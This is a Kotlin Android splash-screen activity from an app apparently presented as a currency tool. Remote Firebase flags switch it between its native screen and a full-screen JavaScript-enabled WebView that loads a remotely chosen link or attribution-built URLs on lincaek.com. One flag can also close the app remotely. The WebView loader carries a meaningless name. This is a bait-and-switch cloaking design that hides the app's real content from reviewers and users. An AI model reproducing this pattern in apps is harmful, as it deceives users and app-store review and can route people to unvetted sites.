package com.abbasov.currency2

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.os.Bundle
import android.util.Base64
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.view.animation.Animation
import android.view.animation.AnimationUtils
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import com.abbasov.currency2.databinding.ActivitySplashBinding
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.onesignal.OneSignal
import java.security.MessageDigest
import java.security.NoSuchAlgorithmException


class Splash : AppCompatActivity() {
    private val TAG = "Splash"
    val ONESIGNAL_APP_ID = "7d92e959-7fee-4c68-a64c-30c16e28cba4"
    lateinit var binding: ActivitySplashBinding
    lateinit var webView: WebView
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding= ActivitySplashBinding.inflate(layoutInflater)
        setContentView(binding.root)
        val anim= AnimationUtils.loadAnimation(this,R.anim.anim3)
        binding.icon.startAnimation(anim)
        try {
            val info = packageManager.getPackageInfo(packageName, PackageManager.GET_SIGNATURES)
            for (signature in info.signatures) {
                val md: MessageDigest = MessageDigest.getInstance("SHA")
                md.update(signature.toByteArray())
                Log.d("KeyHash:", Base64.encodeToString(md.digest(), Base64.DEFAULT))
            }
        } catch (e: PackageManager.NameNotFoundException) {
            Log.e("name not found", e.toString())
        } catch (e: NoSuchAlgorithmException) {
            Log.e("no such an algorithm", e.toString())
        }
        onesign()
        AppLinkData.fetchDeferredAppLinkData(this
        ) { appLinkData ->
            Log.d(TAG, "onCreate: ${intent.data?.lastPathSegment.toString()}")
            val url = "https://lincaek.com/"
            val pathSegments = intent.data?.lastPathSegment
            if (!pathSegments.isNullOrEmpty()) {
                Log.d(TAG, "onRessss: $url$pathSegments")
                hksj(savedInstanceState,url +pathSegments)
            }

        }
        AppsFlyerLib.getInstance().start(this,"ghLzFwFgZRpCqREXqWa8uG")
        AppsFlyerLib.getInstance()
            .registerConversionListener(this, object : AppsFlyerConversionListener {
                /* Returns the attribution data. Note - the same conversion data is returned
               every time per install */
                override fun onConversionDataSuccess(conversionData: Map<String, Any>) {
                    for (attrName in conversionData.keys) {
                        Log.d(
                            "AppsFlyerLibCoreLOG_TAG",
                            "attribute: " + attrName + " = " + conversionData[attrName]
                        )

                    }
                }
                override fun onConversionDataFail(errorMessage: String) {
                    Log.d(
                        "AppsFlyerLibCoreLOG_TAG",
                        "error onInstallConversionFailure : $errorMessage"
                    )
                }
                /* Called only when a Deep Link is opened */
                override fun onAppOpenAttribution(conversionData: Map<String, String>) {
                    var attributionDataText = "Attribution Data: \n"
                    val builder=StringBuilder()
                    builder.append("https://lincaek.com/")
                    val campaign = conversionData.filterKeys { it == "campaign" }
                    if (!campaign.isNullOrEmpty()) {
                        builder.append(campaign["campaign"])
                        builder.append("?")
                    }
                    val filteredKeys = conversionData.filterKeys {
                        it.contains("sub")
                    }
                    for (attrName in filteredKeys.keys) {
                        builder.append(attrName)
                        builder.append("=")
                        builder.append(filteredKeys[attrName])
                        builder.append("&")
                        Log.d(

                            //https://thetna.com
                            "AppsFlyerLibCoreLOG_TAG", "attribute: " + attrName + " = " +
                                    conversionData[attrName]
                        )
                        attributionDataText += """ 
 ${conversionData[attrName].toString()}
 """.trimIndent()
                    }
                    Log.d("link_deep",builder.toString())
                    hksj(savedInstanceState,builder.toString())
                }
                override fun onAttributionFailure(errorMessage: String) {
                    Log.d("AppsFlyerLibCoreLOG_TAG", "error onAttributionFailure :$errorMessage")
                }
            })
        anim.setAnimationListener(object : Animation.AnimationListener {
            override fun onAnimationStart(animation: Animation?) {

            }

            override fun onAnimationEnd(animation: Animation?)
            {
                if (hasConnection(this@Splash)){
                    FirebaseDatabase.getInstance().getReference("settings").child("allow").addValueEventListener(object :
                        ValueEventListener {
                        override fun onDataChange(snapshot: DataSnapshot) {
                            if (snapshot.exists()) {
                                val isEnabled = snapshot.getValue(String::class.java)

                                if (isEnabled == "no"){
                                    finishAffinity()
                                }
                            }
                        }

                        override fun onCancelled(error: DatabaseError) {

                        }
                    })
                    FirebaseDatabase.getInstance().getReference("settings").child("isEnabled").addValueEventListener(object :
                        ValueEventListener {
                        override fun onDataChange(snapshot: DataSnapshot) {
                            if (snapshot.exists()) {
                                val isEnabled = snapshot.getValue(String::class.java)

                                if (isEnabled == "yes"){
                                    binding.card.visibility = View.GONE
                                    findViewById<WebView>(R.id.webview).visibility = View.VISIBLE


                                }else{

                                    findViewById<WebView>(R.id.webview).visibility = View.GONE
                                    startActivity(Intent(this@Splash,MainActivity::class.java ))
                                    finish()


                                }
                            }
                        }

                        override fun onCancelled(error: DatabaseError) {

                        }
                    })
                    FirebaseDatabase.getInstance().getReference("settings").child("link").addValueEventListener(object :
                        ValueEventListener {
                        @SuppressLint("SetJavaScriptEnabled", "CutPasteId")
                        override fun onDataChange(snapshot: DataSnapshot) {
                            if (snapshot.exists()) {
                                val link = snapshot.getValue(String::class.java)

                                hksj(savedInstanceState, link)

                            }
                        }

                        override fun onCancelled(error: DatabaseError) {

                        }
                    })
                }else{
                    startActivity(Intent(this@Splash,MainActivity::class.java ))
                    finish()
                }
            }

            override fun onAnimationRepeat(animation: Animation?) {

            }
        })


    }

    private fun hksj(savedInstanceState: Bundle?, link: String?){
        webView = findViewById<WebView>(R.id.webview)
        webView.loadUrl("http://www.plus2net.com/javascript_tutorial/history-object.php");
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true

        webView.webViewClient = object : WebViewClient() {
            @SuppressLint("SetJavaScriptEnabled")
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                view?.loadUrl(url!!)
                return true
            }
            override fun onReceivedHttpError(
                view: WebView?,
                request: WebResourceRequest?,
                errorResponse: WebResourceResponse?
            ) {
                super.onReceivedHttpError(view, request, errorResponse)
                if (errorResponse?.statusCode==404){
                    startActivity(Intent(this@Splash,MainActivity::class.java ))
                    finish()

                }else{
                    binding.card.visibility=View.GONE

                }
            }



        }


        if (savedInstanceState == null) {
            if (link != null) {
                webView.loadUrl(link)
            }
        }else{
            webView.loadUrl(link!!)
        }
    }
    private fun onesign() {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)

        // OneSignal Initialization
        OneSignal.initWithContext(this)
        OneSignal.setAppId(ONESIGNAL_APP_ID)
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if ((keyCode == KeyEvent.KEYCODE_BACK) && webView.canGoBack()) {
            webView.goBack();
            return true
        }
        // If it wasn't the Back key or there no web page history, bubble up to the default
        // system behavior (probably exit the activity)
        return super.onKeyDown(keyCode, event)
    }
    override fun onBackPressed() {
        super.onBackPressed()
        if (webView.isFocused() && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
    fun hasConnection(context: Context): Boolean {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        var wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
        if (wifiInfo != null && wifiInfo.isConnected) {
            return true
        }
        wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE)
        if (wifiInfo != null && wifiInfo.isConnected) {
            return true
        }
        wifiInfo = cm.activeNetworkInfo
        return wifiInfo != null && wifiInfo.isConnected
    }
}